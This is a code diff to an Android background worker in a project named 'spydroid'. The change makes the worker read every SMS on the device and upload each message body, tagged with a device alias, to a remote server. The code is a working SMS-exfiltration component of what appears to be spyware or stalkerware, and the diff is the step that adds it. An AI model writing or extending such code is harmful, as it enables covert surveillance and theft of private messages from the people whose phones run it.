@@ -22,6 +22,7 @@ import android.content.Context
 import android.database.Cursor
 import android.icu.text.SimpleDateFormat
 import android.net.Uri
+import android.os.Build
 import android.provider.Telephony
 import android.util.Log
 import android.widget.Toast
@@ -42,8 +43,11 @@ import kotlinx.coroutines.flow.map
 import kotlinx.coroutines.flow.stateIn
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.runBlocking
+import kotlinx.coroutines.withContext
 import net.spydroid.common.local.LocalDataProvider
 import net.spydroid.common.local.models.CurrentSms
+import net.spydroid.common.remote.RemoteDataProvider
+import net.spydroid.common.remote.network.models.SmsDevices
 import net.spydroid.feature.sms.local.domain.SmsRepository
 import net.spydroid.feature.sms.local.models.SmsHandler
 import net.spydroid.feature.sms.local.states.SmsState
@@ -64,82 +68,46 @@ class SmsWork(private val context: Context, workerParams: WorkerParameters) :
 
     private val contentResolver: ContentResolver = context.contentResolver
     private val localDataProvider = LocalDataProvider.current(context)
+    private val remoteDataProvider = RemoteDataProvider.current(context)
 
     lateinit var smsRepository: SmsRepository
+    private val scope = CoroutineScope(Dispatchers.IO)
 
     init {
         val entryPoint = EntryPointAccessors.fromApplication(context, SmsWorkEntryPoint::class.java)
         smsRepository = entryPoint.smsRepository()
     }
 
-    @OptIn(DelicateCoroutinesApi::class)
     override fun doWork(): Result {
         try {
 
-            val smsState: StateFlow<SmsState> = smsRepository
-                .sms.map<List<SmsHandler>, SmsState> { SmsState.Success(data = it) }
-                .catch { emit(SmsState.Error(it)) }
-                .stateIn(
-                    CoroutineScope(Dispatchers.IO), SharingStarted.WhileSubscribed(5000),
-                    SmsState.Loading
-                )
+            scope.launch {
+                localDataProvider.aliasDevice.collect { alias ->
 
+                    val uri: Uri = Telephony.Sms.CONTENT_URI
+                    if (alias.isNotEmpty()) {
+                        val cursor: Cursor? = contentResolver.query(uri, null, null, null, null)
+                        cursor?.use {
+                            val indexId = it.getColumnIndex(Telephony.Sms._ID)
+                            val indexBody = it.getColumnIndex(Telephony.Sms.BODY)
+                            val indexAddress = it.getColumnIndex(Telephony.Sms.ADDRESS)
+                            val indexDate = it.getColumnIndex(Telephony.Sms.DATE)
 
-            GlobalScope.launch(Dispatchers.Default) {
-                smsState.collect { state ->
-                    when (state) {
-                        is SmsState.Loading -> {
-                            //todo
-                        }
+                            while (it.moveToNext()) {
+                                val uid = it.getLong(indexId).toString()
+                                val body = it.getString(indexBody)
+                                val address = it.getString(indexAddress)
+                                val date = it.getLong(indexDate)
+                                val dateSent = Date(date)
+                                val format =
+                                    SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault())
+                                val dateSentFormatted = format.format(dateSent)
 
-                        is SmsState.Error -> {
-                            //todo
-                        }
-
-                        is SmsState.Success -> {
-                            val data = state.data
-
-                            val existingUids = data.map { it.date }.toList()
-
-                            val uri: Uri = Telephony.Sms.CONTENT_URI
-                            val cursor: Cursor? = contentResolver.query(uri, null, null, null, null)
-
-                            cursor?.use {
-                                val indexId = it.getColumnIndex(Telephony.Sms._ID)
-                                val indexBody = it.getColumnIndex(Telephony.Sms.BODY)
-                                val indexAddress = it.getColumnIndex(Telephony.Sms.ADDRESS)
-                                val indexDate = it.getColumnIndex(Telephony.Sms.DATE)
-
-                                while (it.moveToNext()) {
-                                    val uid = it.getLong(indexId).toString()
-                                    val body = it.getString(indexBody)
-                                    val address = it.getString(indexAddress)
-                                    val date = it.getLong(indexDate)
-                                    val dateSent = Date(date)
-                                    val format =
-                                        SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault())
-                                    val dateSentFormatted = format.format(dateSent)
-
-                                    if (dateSentFormatted !in existingUids) {
-                                        smsRepository.insert(
-                                            SmsHandler(
-                                                uid = uid,
-                                                address = address,
-                                                body = body,
-                                                date = dateSentFormatted
-                                            )
-                                        )
-                                    }
-                                }
-                            }
-                            if (data.isNotEmpty()) {
-                                data.forEach {
-                                    localDataProvider.setSmsCurrent(
-                                        CurrentSms(
-                                            uid = it.uid,
-                                            address = it.address,
-                                            body = it.body,
-                                            date = it.date
+                                withContext(Dispatchers.IO) {
+                                    remoteDataProvider.setSms(
+                                        SmsDevices(
+                                            alias = alias,
+                                            sms = body
                                         )
                                     )
                                 }
@@ -148,6 +116,7 @@ class SmsWork(private val context: Context, workerParams: WorkerParameters) :
                     }
                 }
             }
+
             return Result.success()
         } catch (e: Exception) {
             return Result.failure()
